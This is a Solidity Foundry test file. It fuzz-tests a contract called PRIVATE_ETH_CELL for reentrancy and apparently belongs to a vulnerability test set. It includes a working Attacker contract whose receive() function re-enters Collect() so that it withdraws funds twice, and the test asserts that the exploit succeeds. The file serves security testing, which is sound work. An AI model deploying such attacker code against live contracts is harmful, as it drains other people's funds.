
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "forge-std/Test.sol";
import {PRIVATE_ETH_CELL, LogFile} from "../src/PRIVATE_ETH_CELL.sol";

contract TestReentrancyPRIVATE_ETH_CELL is Test {

    PRIVATE_ETH_CELL public _contractUnderTest;
    LogFile public log;
    Attacker public _attacker;

    function setUp() public {
        log = new LogFile();
        _contractUnderTest = new PRIVATE_ETH_CELL();
        _contractUnderTest.SetMinSum(1);
        _contractUnderTest.SetLogFile(address(log));
        _contractUnderTest.Initialized();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal, uint256 depositVal) public {
        vm.assume(attackVal > 0 && attackVal <= type(uint128).max / 2);
        vm.assume(depositVal >= attackVal * 2);
        vm.assume(depositVal <= type(uint128).max);
        vm.assume(attackVal >= _contractUnderTest.MinSum());

        vm.deal(address(_attacker), depositVal);
        vm.deal(address(this), depositVal);

        _attacker.setupAttack{value: depositVal}(depositVal, attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PRIVATE_ETH_CELL public _victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = PRIVATE_ETH_CELL(victimAddress);
    }

    function setupAttack(uint256 depositVal, uint256 /* attackVal */) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        _victim.Deposit{value: depositVal}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;
        _victim.Collect(val);

        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            _victim.Collect(storedAttackVal);
            attackCallCount++;
        }
    }
}
